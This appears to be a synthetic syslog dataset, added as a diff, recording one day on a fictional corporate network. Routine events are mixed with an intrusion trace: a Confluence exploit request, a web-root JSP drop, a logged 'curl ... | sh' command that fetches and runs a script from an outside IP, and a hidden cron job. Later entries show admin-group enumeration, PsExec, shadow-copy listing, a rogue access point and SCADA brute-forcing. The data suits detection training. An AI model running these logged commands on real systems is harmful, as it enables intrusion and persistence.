@@ -1,0 +1,233 @@
+<134>1 2026-09-13T00:17:32Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4624 An account was successfully logged on. Subject=CORP\p.singh LogonType=2 Workstation=FIN-WS-043 Source Network Address=10.20.14.43
+<134>1 2026-09-13T01:29:08Z web-dmz-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0035 s
+<134>1 2026-09-13T01:32:24Z hr-ws-023 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=4634 An account was logged off. Subject=CORP\m.novak LogonType=2
+<134>1 2026-09-13T01:45:14Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-13T01:45:57Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for r.tanaka from 10.20.10.6 port 41455 ssh2: ED25519 SHA256:bod7wa7fcjvgi4oqyjhs
+<134>1 2026-09-13T02:28:05Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-13T02:52:46Z web-dmz-02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
+<134>1 2026-09-13T03:14:21Z web-dmz-01 httpd - - [aegis@32473 severity="info"] 45.142.212.100 - - "POST /json/setup-restore.action HTTP/1.1" 200 1873 "-" "python-requests/2.31"
+<132>1 2026-09-13T03:15:02Z web-dmz-01 auditd - - [aegis@32473 severity="warning" user="confluence"] type=PATH name=/opt/atlassian/confluence/webapps/ROOT/x.jsp nametype=CREATE uid=confluence sha256=d4c3b2a1f0e9d8c7b6a5f4e3d2c1b0a9f8e7d6c5b4a3f2e1d0c9b8a7f6e5d4c3 — file created by java (tomcat) under web root
+<131>1 2026-09-13T03:20:49Z web-dmz-01 auditd - - [aegis@32473 severity="err" user="confluence"] type=EXECVE ppid=java(tomcat) comm=bash a0=/bin/bash a1=-c a2="curl -s http://45.142.212.100/k.sh | sh" uid=confluence
+<133>1 2026-09-13T03:22:15Z web-dmz-01 cron - - [aegis@32473 severity="notice" user="confluence"] (confluence) REPLACE crontab: */5 * * * * /var/tmp/.cache/.k >/dev/null 2>&1
+<134>1 2026-09-13T03:51:59Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.18.31 to fd:20:53:dd:3a:b7 (log-ws-031) via eth0
+<134>1 2026-09-13T04:00:54Z dc01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/apt/apt.systemd.daily )
+<134>1 2026-09-13T04:15:38Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.9 port 59127 ssh2: ED25519 SHA256:4hxijf1ztjr2ry6y24lg
+<134>1 2026-09-13T04:37:17Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.42 to 52:ad:b6:89:d6:90 (fin-ws-042) via eth0
+<133>1 2026-09-13T05:30:57Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T05:42:27Z log-ws-031 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=4634 An account was logged off. Subject=CORP\c.dubois LogonType=2
+<134>1 2026-09-13T06:41:48Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for r.tanaka from 10.20.10.5 port 49303 ssh2: ED25519 SHA256:97z6mju09f5c85b1pbc2
+<134>1 2026-09-13T07:00:03Z hr-ws-023 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=4624 An account was successfully logged on. Subject=CORP\m.novak LogonType=2 Workstation=HR-WS-023 Source Network Address=10.20.16.23
+<134>1 2026-09-13T07:10:01Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\m.novak CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-13T07:16:11Z log-ws-031 sysmon - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\c.dubois
+<134>1 2026-09-13T07:17:08Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_patch from 10.20.10.7 port 52977 ssh2: ED25519 SHA256:owze1bk0aqhwsryoypjy
+<134>1 2026-09-13T07:19:29Z file-srv-02 systemd - - [aegis@32473 severity="info"] Started Daily apt download activities.
+<134>1 2026-09-13T07:29:06Z web-dmz-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.5 port 42431 ssh2: ED25519 SHA256:0t0mky5kx75nvzza1yvn
+<133>1 2026-09-13T07:31:54Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+<134>1 2026-09-13T07:41:46Z log-ws-031 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T07:54:58Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\m.novak
+<134>1 2026-09-13T07:58:16Z file-srv-02 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0000 s
+<133>1 2026-09-13T08:03:50Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T08:08:02Z file-srv-02 kernel - - [aegis@32473 severity="info"] [251731.875525] eth0: link is up, 10 Gbps, full duplex
+<132>1 2026-09-13T08:13:36Z web-dmz-01 monit - - [aegis@32473 severity="warning"] filesystem / usage 89% exceeds threshold 80%
+<134>1 2026-09-13T08:21:32Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.43 to de:d3:fd:45:dd:d7 (fin-ws-043) via eth0
+<134>1 2026-09-13T08:39:19Z print-srv-01 kernel - - [aegis@32473 severity="info"] [703211.662276] eth0: link is up, 10 Gbps, full duplex
+<133>1 2026-09-13T09:15:58Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/tail -f /var/log/syslog
+<134>1 2026-09-13T09:29:02Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.5 port 48590 ssh2: ED25519 SHA256:1ihqlhsj7m8ydmbfegy3
+<134>1 2026-09-13T09:29:15Z ops-ws-008 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=4624 An account was successfully logged on. Subject=CORP\s.ahmed LogonType=2 Workstation=OPS-WS-008 Source Network Address=10.20.17.8
+<134>1 2026-09-13T09:48:41Z dns-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/apt/apt.systemd.daily )
+<134>1 2026-09-13T09:51:35Z print-srv-01 systemd - - [aegis@32473 severity="info"] Started Daily apt download activities.
+<134>1 2026-09-13T09:56:36Z dc02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<133>1 2026-09-13T09:58:41Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/apt update
+<134>1 2026-09-13T10:03:57Z web-dmz-02 kernel - - [aegis@32473 severity="info"] [541803.834195] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T10:27:39Z ops-ws-008 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=4634 An account was logged off. Subject=CORP\s.ahmed LogonType=2
+<134>1 2026-09-13T10:30:38Z vpn-gw-01 kernel - - [aegis@32473 severity="info"] [420723.268833] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T11:02:57Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to d0:59:60:39:27:ed (adm-ws-002) via eth0
+<134>1 2026-09-13T11:07:31Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.17.8 to c5:1f:26:47:8d:16 (ops-ws-008) via eth0
+<134>1 2026-09-13T11:08:55Z rnd-ws-118 sysmon - - [aegis@32473 severity="info" user="CORP\l.fischer"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\l.fischer CommandLine="chrome.exe --type=renderer"
+<133>1 2026-09-13T11:11:01Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T11:15:19Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'DC-System-State' completed successfully: 780 GB processed, 0 warnings.
+<134>1 2026-09-13T11:30:15Z adm-ws-002 sysmon - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\r.tanaka
+<134>1 2026-09-13T11:37:44Z print-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<134>1 2026-09-13T12:09:42Z rnd-ws-117 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T12:26:21Z print-srv-01 systemd - - [aegis@32473 severity="info"] Started Cleanup of Temporary Directories.
+<133>1 2026-09-13T12:43:35Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/apt update
+<134>1 2026-09-13T12:48:36Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4624 An account was successfully logged on. Subject=CORP\r.tanaka LogonType=2 Workstation=ADM-WS-002 Source Network Address=10.20.10.2
+<134>1 2026-09-13T12:50:37Z fin-ws-042 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\j.okafor"] EventID=4624 An account was successfully logged on. Subject=CORP\j.okafor LogonType=2 Workstation=FIN-WS-042 Source Network Address=10.20.14.42
+<134>1 2026-09-13T13:09:36Z ops-ws-008 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=4624 An account was successfully logged on. Subject=CORP\s.ahmed LogonType=7 Workstation=OPS-WS-008 Source Network Address=10.20.17.8
+<134>1 2026-09-13T13:18:22Z web-dmz-02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<134>1 2026-09-13T13:20:18Z ops-ws-008 sysmon - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\s.ahmed
+<134>1 2026-09-13T13:29:30Z vpn-gw-01 systemd - - [aegis@32473 severity="info"] Started Daily apt download activities.
+<134>1 2026-09-13T13:30:21Z eng-ws-055 sysmon - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\t.berg CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-13T13:36:54Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to c2:38:28:82:68:fe (adm-ws-002) via eth0
+<134>1 2026-09-13T13:50:07Z fin-ws-042 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\j.okafor"] EventID=4624 An account was successfully logged on. Subject=CORP\j.okafor LogonType=2 Workstation=FIN-WS-042 Source Network Address=10.20.14.42
+<134>1 2026-09-13T13:51:41Z backup-01 chronyd - - [aegis@32473 severity="info"] Selected source 10.20.1.10 (dc01), offset +0.0062 s
+<134>1 2026-09-13T13:56:38Z ops-ws-008 sysmon - - [aegis@32473 severity="info" user="CORP\s.ahmed"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\s.ahmed
+<134>1 2026-09-13T14:01:30Z log-ws-031 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=4634 An account was logged off. Subject=CORP\c.dubois LogonType=2
+<133>1 2026-09-13T14:02:04Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_backup"] svc_backup : TTY=pts/0 ; PWD=/home/svc_backup ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T14:22:09Z print-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<134>1 2026-09-13T14:42:40Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\m.novak
+<134>1 2026-09-13T14:43:48Z hr-ws-023 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=4624 An account was successfully logged on. Subject=CORP\m.novak LogonType=10 Workstation=HR-WS-023 Source Network Address=10.20.16.23
+<134>1 2026-09-13T15:00:41Z eng-ws-055 sysmon - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\t.berg
+<134>1 2026-09-13T15:11:37Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.16.23 to d6:9e:1e:ff:93:e4 (hr-ws-023) via eth0
+<134>1 2026-09-13T15:31:10Z adm-ws-002 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T15:32:31Z file-srv-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
+<134>1 2026-09-13T15:32:47Z rnd-ws-117 sysmon - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\a.mehta
+<134>1 2026-09-13T15:36:06Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Mail-Store' completed successfully: 888 GB processed, 0 warnings.
+<134>1 2026-09-13T15:57:00Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Mail-Store' completed successfully: 755 GB processed, 0 warnings.
+<134>1 2026-09-13T16:07:46Z web-dmz-02 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.4 port 41904 ssh2: ED25519 SHA256:njt4z6vpa20iob92jsxw
+<134>1 2026-09-13T16:16:35Z vpn-gw-01 kernel - - [aegis@32473 severity="info"] [419266.801008] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T16:25:10Z eng-ws-055 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\t.berg"] EventID=4634 An account was logged off. Subject=CORP\t.berg LogonType=2
+<134>1 2026-09-13T16:29:35Z mail-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
+<134>1 2026-09-13T16:33:55Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to 05:5a:b3:cf:a9:b0 (adm-ws-002) via eth0
+<134>1 2026-09-13T16:41:43Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4624 An account was successfully logged on. Subject=CORP\p.singh LogonType=10 Workstation=FIN-WS-043 Source Network Address=10.20.14.43
+<134>1 2026-09-13T16:42:24Z hr-ws-023 sysmon - - [aegis@32473 severity="info" user="CORP\m.novak"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\m.novak
+<134>1 2026-09-13T16:48:34Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'DC-System-State' completed successfully: 239 GB processed, 0 warnings.
+<134>1 2026-09-13T16:58:31Z adm-ws-002 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=4634 An account was logged off. Subject=CORP\r.tanaka LogonType=2
+<134>1 2026-09-13T17:02:11Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.42 to 64:81:14:ca:04:cf (fin-ws-042) via eth0
+<134>1 2026-09-13T17:16:14Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.117 to 30:41:28:1c:89:55 (rnd-ws-117) via eth0
+<134>1 2026-09-13T17:26:28Z adm-ws-002 sysmon - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\r.tanaka CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-13T17:44:58Z adm-ws-002 sysmon - - [aegis@32473 severity="info" user="CORP\r.tanaka"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\r.tanaka CommandLine="chrome.exe --type=renderer"
+<133>1 2026-09-13T17:51:39Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="r.tanaka"] r.tanaka : TTY=pts/0 ; PWD=/home/r.tanaka ; USER=root ; COMMAND=/usr/bin/systemctl restart confluence
+<134>1 2026-09-13T18:12:59Z fin-ws-043 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T18:13:00Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4634 An account was logged off. Subject=CORP\p.singh LogonType=2
+<134>1 2026-09-13T18:16:01Z ops-ws-008 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T18:16:25Z fin-ws-043 sysmon - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\p.singh
+<133>1 2026-09-13T18:22:39Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="k.olsen"] k.olsen : TTY=pts/0 ; PWD=/home/k.olsen ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T18:25:43Z fin-ws-043 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=4624 An account was successfully logged on. Subject=CORP\p.singh LogonType=7 Workstation=FIN-WS-043 Source Network Address=10.20.14.43
+<134>1 2026-09-13T18:32:48Z log-ws-031 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=4634 An account was logged off. Subject=CORP\c.dubois LogonType=2
+<134>1 2026-09-13T18:33:07Z file-srv-02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/apt/apt.systemd.daily )
+<134>1 2026-09-13T18:34:55Z rnd-ws-117 sysmon - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\a.mehta CommandLine="chrome.exe --type=renderer"
+<134>1 2026-09-13T18:38:08Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'DC-System-State' completed successfully: 298 GB processed, 0 warnings.
+<134>1 2026-09-13T19:01:12Z web-dmz-02 sshd - - [aegis@32473 severity="info"] Accepted publickey for k.olsen from 10.20.10.3 port 54083 ssh2: ED25519 SHA256:acq6sfdqxjbge2tqx1qe
+<134>1 2026-09-13T19:27:52Z adm-ws-002 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-13T19:40:57Z file-srv-02 kernel - - [aegis@32473 severity="info"] [630352.327047] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T19:45:02Z web-dmz-01 kernel - - [aegis@32473 severity="info"] [849106.748228] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T20:53:50Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.16.23 to fe:a7:ef:7a:e4:45 (hr-ws-023) via eth0
+<134>1 2026-09-13T20:55:42Z web-dmz-02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<134>1 2026-09-13T21:39:55Z vpn-gw-01 sshd - - [aegis@32473 severity="info"] Accepted publickey for svc_backup from 10.20.10.9 port 52305 ssh2: ED25519 SHA256:s8fktohq2w5lg779v0es
+<134>1 2026-09-13T21:42:06Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Nightly-FileServers' completed successfully: 455 GB processed, 0 warnings.
+<134>1 2026-09-13T22:01:45Z fin-ws-042 sysmon - - [aegis@32473 severity="info" user="CORP\j.okafor"] EventID=1 ProcessCreate Image=C:\Program Files\Microsoft Office\root\Office16\OUTLOOK.EXE ParentImage=C:\Windows\explorer.exe User=CORP\j.okafor
+<134>1 2026-09-13T22:05:03Z web-dmz-02 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/certbot )
+<133>1 2026-09-13T22:08:55Z web-dmz-01 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/journalctl -xe
+<134>1 2026-09-13T22:09:24Z web-dmz-02 sshd - - [aegis@32473 severity="info"] Accepted publickey for r.tanaka from 10.20.10.4 port 59324 ssh2: ED25519 SHA256:e4xb0fsyy3acljh8dxbe
+<134>1 2026-09-13T22:14:52Z backup-01 kernel - - [aegis@32473 severity="info"] [430863.942464] eth0: link is up, 10 Gbps, full duplex
+<134>1 2026-09-13T22:21:14Z rnd-ws-118 sysmon - - [aegis@32473 severity="info" user="CORP\l.fischer"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\l.fischer CommandLine="chrome.exe --type=renderer"
+<133>1 2026-09-13T23:05:40Z dc01 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="notice" user="CORP\m.novak"] EventID=4661 A handle to an object was requested: Object Type=SAM_GROUP Object Name=Domain Admins; Subject=CORP\m.novak; Client Address=10.20.99.15; Process=net1.exe (net group "Domain Admins" /domain)
+<132>1 2026-09-13T23:20:11Z file-srv-01 smbd - - [aegis@32473 severity="warning" user="CORP\m.novak"] Share enumeration: client 10.20.99.15 (CORP\m.novak) issued NetShareEnumAll and connected to 14 shares in 40 s including finance$, hr$, IT-admin$
+<134>1 2026-09-13T23:31:07Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to 30:8f:f5:42:6d:8a (adm-ws-002) via eth0
+<133>1 2026-09-13T23:35:20Z backup-01 Microsoft-Windows-Service-Control-Manager - - [aegis@32473 severity="notice" user="CORP\r.tanaka"] EventID=7045 A service was installed in the system. Service Name: VeeamTransportSvc; Image Path: C:\Program Files\Veeam\Backup Transport\VeeamTransportSvc.exe; Account: LocalSystem; installed by CORP\r.tanaka from 10.20.10.2
+<133>1 2026-09-13T23:38:44Z backup-01 sysmon - - [aegis@32473 severity="notice" user="CORP\r.tanaka"] EventID=1 ProcessCreate Image=C:\Windows\PSEXESVC.exe ParentImage=C:\Windows\System32\services.exe User=NT AUTHORITY\SYSTEM — PsExec service session initiated from 10.20.10.2 (ADM-WS-002) by CORP\r.tanaka
+<134>1 2026-09-13T23:45:47Z log-ws-031 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\c.dubois"] EventID=4624 An account was successfully logged on. Subject=CORP\c.dubois LogonType=10 Workstation=LOG-WS-031 Source Network Address=10.20.18.31
+<134>1 2026-09-13T23:53:50Z rnd-ws-117 Microsoft-Windows-Security-Auditing - - [aegis@32473 severity="info" user="CORP\a.mehta"] EventID=4624 An account was successfully logged on. Subject=CORP\a.mehta LogonType=2 Workstation=RND-WS-117 Source Network Address=10.20.15.117
+<132>1 2026-09-13T23:59:33Z web-dmz-01 monit - - [aegis@32473 severity="warning"] filesystem / usage 86% exceeds threshold 80%
+<132>1 2026-09-14T00:10:09Z file-srv-01 sysmon - - [aegis@32473 severity="warning" user="CORP\r.tanaka"] EventID=1 ProcessCreate Image=C:\Windows\System32\vssadmin.exe CommandLine="vssadmin list shadows" User=CORP\r.tanaka ParentImage=C:\Windows\System32\cmd.exe
+<134>1 2026-09-14T00:41:20Z rnd-ws-118 Microsoft-Windows-GroupPolicy - - [aegis@32473 severity="info"] EventID=1502 The Group Policy settings for the computer were processed successfully. New settings from 3 Group Policy objects were detected and applied.
+<134>1 2026-09-14T00:42:52Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.14.43 to 8b:be:f5:0b:a6:93 (fin-ws-043) via eth0
+<132>1 2026-09-14T01:43:47Z dns-01 monit - - [aegis@32473 severity="warning"] filesystem / usage 92% exceeds threshold 80%
+<134>1 2026-09-14T02:23:06Z dns-01 systemd - - [aegis@32473 severity="info"] Started Cleanup of Temporary Directories.
+<134>1 2026-09-14T02:25:09Z dns-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
+<131>1 2026-09-14T02:25:12Z site-alpha-wlc wlc - - [aegis@32473 severity="err"] Rogue AP detected: SSID="SITE-ALPHA-OPS" BSSID=3c:22:fb:9a:11:07 impersonating corporate SSID; 412 deauthentication frames observed against legitimate clients in 60 s (evil-twin / adversary-in-the-middle pattern)
+<132>1 2026-09-14T02:44:03Z scada-hmi-01 hmi-auth - - [aegis@32473 severity="warning"] 37 failed operator logons from 10.30.1.77 in 4 minutes (accounts: operator, engineer, admin, maint); then successful logon as maint
+<134>1 2026-09-14T02:57:03Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.10.2 to bd:26:2b:dc:a4:de (adm-ws-002) via eth0
+<134>1 2026-09-14T03:07:52Z dns-01 dhcpd - - [aegis@32473 severity="info"] DHCPACK on 10.20.15.118 to 12:2b:39:0b:32:33 (rnd-ws-118) via eth0
+<133>1 2026-09-14T03:23:39Z web-dmz-02 sudo - - [aegis@32473 severity="notice" user="svc_patch"] svc_patch : TTY=pts/0 ; PWD=/home/svc_patch ; USER=root ; COMMAND=/usr/bin/apt update
+<134>1 2026-09-14T05:01:26Z backup-01 VeeamBackup - - [aegis@32473 severity="info" user="CORP\svc_backup"] Backup job 'Mail-Store' completed successfully: 82 GB processed, 0 warnings.
+<134>1 2026-09-14T05:39:43Z fin-ws-043 sysmon - - [aegis@32473 severity="info" user="CORP\p.singh"] EventID=1 ProcessCreate Image=C:\Program Files\Google\Chrome\Application\chrome.exe ParentImage=C:\Windows\explorer.exe User=CORP\p.singh CommandLine="chrome.exe --type=renderer"
+<132>1 2026-09-14T06:02:05Z dc01 Windows-Firewall - - [aegis@32473 severity="warning"] Port scan detected from 10.50.1.10: 1,000 blocked inbound connection attempts in 15 s
+<132>1 2026-09-14T06:06:30Z file-srv-01 Windows-Firewall - - [aegis@32473 severity="warning"] Port scan detected from 10.50.1.10: 998 blocked inbound connection attempts in 14 s
+<132>1 2026-09-14T06:10:15Z backup-01 Windows-Firewall - - [aegis@32473 severity="warning"] Port scan detected from 10.50.1.10: 1,000 blocked inbound connection attempts in 13 s
+<134>1 2026-09-14T06:14:06Z dns-01 CRON - - [aegis@32473 severity="info"] (root) CMD (/usr/lib/sysstat/sa1 )
